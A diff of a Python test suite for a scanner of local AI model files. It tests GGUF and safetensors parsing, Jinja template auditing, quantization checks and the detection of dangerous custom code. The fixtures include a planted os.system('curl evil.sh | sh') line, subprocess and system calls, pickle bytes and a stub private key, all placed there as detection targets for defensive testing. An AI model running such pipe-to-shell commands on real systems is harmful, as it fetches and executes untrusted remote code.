@@ -9,13 +9,13 @@ import math
 import struct
 from pathlib import Path
 
-from localguard.inspectors.gguf_inspector import verify_gguf_file
-from localguard.inspectors.jinja_ast import audit_jinja_template, _shannon_entropy
-from localguard.inspectors.safetensors_mlx import (
+from anubis.inspectors.gguf_inspector import verify_gguf_file
+from anubis.inspectors.jinja_ast import audit_jinja_template, _shannon_entropy
+from anubis.inspectors.safetensors_mlx import (
     inspect_model_directory,
     verify_safetensors_file,
 )
-from localguard.models import ScanReport, Severity
+from anubis.models import ScanReport, Severity
 
 
 def _build_synthetic_gguf(path: Path, declared_elements: int, actual_trailing_bytes: int) -> None:
@@ -69,6 +69,28 @@ def _build_gguf_with_tensor_info(
         f.write(b"\x00" * (pad + actual_trailing_bytes))
 
 
+def _build_gguf_with_metadata(
+    path: Path,
+    metadata: list[tuple[bytes, int, bytes]],
+    tensors: list[tuple[bytes, list[int], int, int]],
+    actual_trailing_bytes: int,
+) -> None:
+    with open(path, "wb") as f:
+        f.write(b"GGUF" + struct.pack("<I", 3))
+        f.write(struct.pack("<Q", len(tensors)) + struct.pack("<Q", len(metadata)))
+        for key, value_type, value_bytes in metadata:
+            f.write(struct.pack("<Q", len(key)) + key)
+            f.write(struct.pack("<I", value_type) + value_bytes)
+        for name, dims, ggml_type, rel_offset in tensors:
+            f.write(struct.pack("<Q", len(name)) + name)
+            f.write(struct.pack("<I", len(dims)))
+            for dim in dims:
+                f.write(struct.pack("<Q", dim))
+            f.write(struct.pack("<I", ggml_type) + struct.pack("<Q", rel_offset))
+        pad = (32 - (f.tell() % 32)) % 32
+        f.write(b"\x00" * (pad + actual_trailing_bytes))
+
+
 def _write_valid_safetensors(path: Path, tensor_name: str = "weight", n_bytes: int = 32) -> None:
     """Writes a fully consistent .safetensors file (one F16 tensor sized from its shape)."""
     elems = n_bytes // 2
@@ -78,6 +100,19 @@ def _write_valid_safetensors(path: Path, tensor_name: str = "weight", n_bytes: i
         f.write(struct.pack("<Q", len(raw_json)))
         f.write(raw_json)
         f.write(b"\x00" * n_bytes)
+
+
+def _write_shard(path: Path, tensors: dict[str, tuple[str, list[int]]]) -> None:
+    dtype_bytes = {"F32": 4, "U32": 4, "F16": 2}
+    header = {}
+    payload = bytearray()
+    for name, (dtype, shape) in tensors.items():
+        n_bytes = math.prod(shape) * dtype_bytes[dtype]
+        begin = len(payload)
+        payload.extend(b"\x00" * n_bytes)
+        header[name] = {"dtype": dtype, "shape": shape, "data_offsets": [begin, len(payload)]}
+    raw = json.dumps(header).encode("utf-8")
+    path.write_bytes(struct.pack("<Q", len(raw)) + raw + payload)
 
 
 def test_gguf_valid_and_bleeding_llama_overread(tmp_path: Path) -> None:
@@ -138,6 +173,74 @@ def test_gguf_overlapping_tensor_spans(tmp_path: Path) -> None:
     assert any(
         f.severity == Severity.HIGH and "Overlapping" in f.title for f in report.findings
     )
+
+
+def test_gguf_skipped_metadata_array_cannot_seek_past_eof(tmp_path: Path) -> None:
+    path = tmp_path / "array_bomb.gguf"
+    array_value = struct.pack("<I", 0) + struct.pack("<Q", 10_000)
+    _build_gguf_with_metadata(
+        path,
+        [(b"tokenizer.ggml.tokens", 9, array_value)],
+        [],
+        actual_trailing_bytes=0,
+    )
+    report = ScanReport(target=str(path))
+
+    verify_gguf_file(path, report)
+
+    assert any(f.severity == Severity.CRITICAL for f in report.findings)
+    assert not any(f.severity == Severity.PASS for f in report.findings)
+
+
+def test_gguf_metadata_array_nesting_is_bounded(tmp_path: Path) -> None:
+    path = tmp_path / "nested_arrays.gguf"
+    nested = struct.pack("<IQ", 9, 1) * 20 + struct.pack("<IQ", 0, 1) + b"\x00"
+    _build_gguf_with_metadata(path, [(b"nested", 9, nested)], [], actual_trailing_bytes=0)
+    report = ScanReport(target=str(path))
+
+    verify_gguf_file(path, report)
+
+    assert any(f.severity == Severity.CRITICAL for f in report.findings)
+    assert not any(f.severity == Severity.PASS for f in report.findings)
+
+
+def test_gguf_unknown_type_never_emits_pass(tmp_path: Path) -> None:
+    path = tmp_path / "unknown_type.gguf"
+    _build_gguf_with_tensor_info(path, [(b"weight", [16], 999, 0)], actual_trailing_bytes=64)
+    report = ScanReport(target=str(path))
+
+    verify_gguf_file(path, report)
+
+    assert any(f.severity == Severity.MEDIUM and "Unrecognized" in f.title for f in report.findings)
+    assert not any(f.severity == Severity.PASS for f in report.findings)
+
+
+def test_gguf_invalid_alignment_never_emits_pass(tmp_path: Path) -> None:
+    path = tmp_path / "bad_alignment.gguf"
+    _build_gguf_with_metadata(
+        path,
+        [(b"general.alignment", 4, struct.pack("<I", 3))],
+        [(b"weight", [16], 0, 0)],
+        actual_trailing_bytes=64,
+    )
+    report = ScanReport(target=str(path))
+
+    verify_gguf_file(path, report)
+
+    assert any(f.severity == Severity.HIGH and "Alignment" in f.title for f in report.findings)
+    assert not any(f.severity == Severity.PASS for f in report.findings)
+
+
+def test_gguf_random_malformed_headers_do_not_raise(tmp_path: Path) -> None:
+    import random
+
+    rng = random.Random(1934)
+    for index in range(64):
+        path = tmp_path / f"fuzz_{index}.gguf"
+        path.write_bytes(b"GGUF" + rng.randbytes(rng.randint(0, 128)))
+        report = ScanReport(target=str(path))
+        verify_gguf_file(path, report)
+        assert report.findings
 
 
 def test_safetensors_offset_verification(tmp_path: Path) -> None:
@@ -205,6 +308,18 @@ def test_safetensors_malformed_descriptor_does_not_crash(tmp_path: Path) -> None
     assert any(f.severity == Severity.CRITICAL for f in report.findings)
 
 
+def test_safetensors_random_malformed_headers_do_not_raise(tmp_path: Path) -> None:
+    import random
+
+    rng = random.Random(9281)
+    for index in range(32):
+        path = tmp_path / f"fuzz_{index}.safetensors"
+        path.write_bytes(struct.pack("<Q", 24) + rng.randbytes(24))
+        report = ScanReport(target=str(path))
+        verify_safetensors_file(path, report)
+        assert report.findings
+
+
 def test_jinja_ast_backdoor_and_ssti() -> None:
     malicious_template = """
     {% for message in messages %}
@@ -264,6 +379,18 @@ def test_jinja_ast_clean_template_passes() -> None:
     assert any(f.severity == Severity.PASS for f in report.findings)
 
 
+def test_jinja_random_malformed_templates_do_not_raise() -> None:
+    import random
+
+    rng = random.Random(771)
+    alphabet = "{}%#@$'\"/\\ abcdef0123\n"
+    for index in range(64):
+        template = "".join(rng.choice(alphabet) for _ in range(rng.randint(0, 96)))
+        report = ScanReport(target=f"fuzz_template_{index}")
+        audit_jinja_template(template, f"fuzz_template_{index}", report)
+        assert report.findings
+
+
 def test_mlx_directory_hygiene(tmp_path: Path) -> None:
     model_dir = tmp_path / "models--someorg--custom-tts"
     snap = model_dir / "snapshots" / "abc123"
@@ -271,6 +398,7 @@ def test_mlx_directory_hygiene(tmp_path: Path) -> None:
 
     _write_valid_safetensors(snap / "model.safetensors")
     (snap / "pytorch_model.bin").write_bytes(b"\x80\x02\x47\x4a")  # pickle opcode bytes
+    (snap / "legacy.ckpt").write_bytes(b"pickle")
     (snap / "config.json").write_text(json.dumps({"auto_map": {"AutoModel": "modeling_custom.AutoModel"}}))
     (snap / "modeling_custom.py").write_text(
         "import subprocess\n"
@@ -279,18 +407,86 @@ def test_mlx_directory_hygiene(tmp_path: Path) -> None:
         "        os.system('curl evil.sh | sh')\n"
     )
     (snap / "tokenizer_config.json").write_text(
-        json.dumps({"chat_template": "{% for m in messages %}{{ m.content }}{% endfor %}"})
+        json.dumps({
+            "auto_map": {"AutoTokenizer": "modeling_custom.CustomTokenizer"},
+            "chat_template": "{% for m in messages %}{{ m.content }}{% endfor %}",
+        })
     )
 
     report = ScanReport(target=str(model_dir))
     templates = inspect_model_directory(model_dir, report)
     severities_and_titles = [(f.severity, f.title) for f in report.findings]
     assert any(f.severity == Severity.HIGH and "Pickle" in f.title for f in report.findings)
-    assert any("auto_map" in t for _, t in severities_and_titles)
+    assert any("Remote-Code" in t for _, t in severities_and_titles)
     assert any("Suspicious Import 'subprocess'" in t for _, t in severities_and_titles)
     assert any("Dangerous Function Call 'system()'" in t for _, t in severities_and_titles)
     assert len(templates) == 1
     assert "m.content" in templates[0]
+    assert any("legacy.ckpt" in f.title for f in report.findings)
+
+
+def test_custom_code_import_aliases_are_audited(tmp_path: Path) -> None:
+    code = tmp_path / "modeling_custom.py"
+    code.write_text(
+        "import subprocess as sp\n"
+        "import urllib.request as url\n"
+        "from os import system as execute\n"
+        "sp.run(['curl', 'https://example.invalid'])\n"
+        "url.urlopen('https://example.invalid')\n"
+        "execute('id')\n"
+    )
+    report = ScanReport(target=str(code))
+
+    from anubis.inspectors.safetensors_mlx import audit_python_file_ast
+    audit_python_file_ast(code, report)
+
+    assert any("Suspicious Import 'urllib.request'" in f.title for f in report.findings)
+    calls = [f for f in report.findings if f.severity == Severity.CRITICAL]
+    assert len(calls) == 3
+
+
+def test_mlx_quantization_shape_ratio_passes(tmp_path: Path) -> None:
+    model_dir = tmp_path / "quantized"
+    model_dir.mkdir()
+    _write_shard(
+        model_dir / "model.safetensors",
+        {
+            "layer.weight": ("U32", [4, 8]),
+            "layer.scales": ("F32", [4, 1]),
+            "layer.biases": ("F32", [4, 1]),
+        },
+    )
+    (model_dir / "config.json").write_text(
+        json.dumps({"quantization": {"bits": 4, "group_size": 64}})
+    )
+    report = ScanReport(target=str(model_dir))
+
+    inspect_model_directory(model_dir, report)
+
+    assert any(
+        f.severity == Severity.PASS and "Quantization Shape Ratios" in f.title
+        for f in report.findings
+    )
+
+
+def test_mlx_quantization_shape_ratio_mismatch_is_critical(tmp_path: Path) -> None:
+    model_dir = tmp_path / "bad_quantized"
+    model_dir.mkdir()
+    _write_shard(
+        model_dir / "model.safetensors",
+        {"layer.weight": ("U32", [4, 7]), "layer.scales": ("F32", [4, 1])},
+    )
+    (model_dir / "config.json").write_text(
+        json.dumps({"quantization": {"bits": 4, "group_size": 64}})
+    )
+    report = ScanReport(target=str(model_dir))
+
+    inspect_model_directory(model_dir, report)
+
+    assert any(
+        f.severity == Severity.CRITICAL and "Weight/Scale Shape Ratio" in f.title
+        for f in report.findings
+    )
 
 
 def test_workspace_secret_scanner(tmp_path: Path) -> None:
@@ -302,7 +498,7 @@ def test_workspace_secret_scanner(tmp_path: Path) -> None:
     (keys_dir / "id_ed25519").write_text("-----BEGIN OPENSSH PRIVATE KEY-----\n")
 
     report = ScanReport(target=str(tmp_path))
-    from localguard.inspectors.env_audit import audit_workspace_secrets
+    from anubis.inspectors.env_audit import audit_workspace_secrets
     audit_workspace_secrets(tmp_path, report)
 
     high = [f for f in report.findings if f.severity == Severity.HIGH]
